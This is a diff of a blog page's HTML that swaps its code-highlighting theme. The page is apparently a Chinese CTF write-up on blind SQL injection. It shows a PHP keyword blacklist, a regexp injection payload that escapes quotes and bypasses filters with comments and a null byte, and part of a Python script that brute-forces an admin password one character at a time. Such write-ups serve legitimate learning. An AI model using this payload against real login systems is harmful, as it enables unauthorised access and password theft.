@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,21 +255,21 @@
             <div class="markdown-body">
               <h2 id=""><a href="#" class="headerlink" title=".`."></a>.`.</h2><p><img src="https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg" srcset="/img/loading.gif" alt="01.png">      </p>
 <p><code>robots.txt</code>     </p>
-<div class="hljs"><pre><code>User-agent: *
-Disallow: /hint.txt      </code></pre></div>
+<pre><code>User-agent: *
+Disallow: /hint.txt      </code></pre>
 <p><code>hint.txt</code>      </p>
-<div class="hljs"><pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;
+<pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;
 
 
 If $_POST[&#39;passwd&#39;] === admin&#39;s password,
 
-Then you will get the flag;     </code></pre></div>
+Then you will get the flag;     </code></pre>
 <p>regexp正则注入<br><code>regexp</code>函数，匹配字符      </p>
 <p><img src="https://s.pc.qq.com/tousu/img/20210422/1627861_1619091624.jpg" srcset="/img/loading.gif" alt="02.png">         </p>
 <p>单引号被过        </p>
 <p>用<code>\</code>转义username的单引号，passwd后接<code>||</code>(或)         </p>
 <p>payload:<code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>     </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> string
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> string
 <span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
 
@@ -282,7 +290,7 @@ url = <span class="hljs-string">&#x27;http://83eb23d8-2065-4521-9970-018a0b4ce88
             <span class="hljs-keyword">break</span>
     <span class="hljs-keyword">if</span> m==<span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:
         <span class="hljs-keyword">break</span>
-print(passwd)</code></pre></div></code></pre>
+print(passwd)</code></pre></code></pre>
 <p><img src="https://s.pc.qq.com/tousu/img/20210422/1945636_1619091932.jpg" srcset="/img/loading.gif" alt="03.png"></p>
 
             </div>
@@ -428,6 +436,8 @@ print(passwd)</code></pre></div></code></pre>
 
 
 
+  
+    
   
 
 
